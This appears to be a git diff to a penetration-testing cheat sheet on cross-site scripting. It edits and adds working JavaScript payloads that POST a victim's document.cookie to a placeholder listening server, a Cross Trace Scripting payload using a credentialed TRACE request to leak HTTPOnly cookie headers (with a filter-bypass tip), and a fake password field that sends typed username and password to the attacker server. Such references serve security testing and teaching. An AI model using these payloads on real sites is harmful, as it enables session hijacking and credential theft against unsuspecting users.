@@ -71,11 +71,32 @@ Create an instance of server listening on a public port. After sending the follo
 
 ```
 <script>
-fetch('<server>', {
+fetch('<listening server>', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
+</script>
+```
+
+### Cross Trace Scripting
+
+By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server&#x20;
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.withCredentials = true;
+req.open('TRACE','<URL>',true);        #putting \r\nTRACE instead of TRACE might bypass some option filters
+req.send();
+function handleResponse() {
+    fetch('<listening server>', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: this.getAllResponseHeaders()
+        });
+};
 </script>
 ```
 
@@ -85,7 +106,7 @@ Create an instance of server listening on a public port. Send the following payl
 
 ```
 <input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('<server>',{
+<input type=password name=password onchange="if(this.value.length)fetch('<listening server>',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
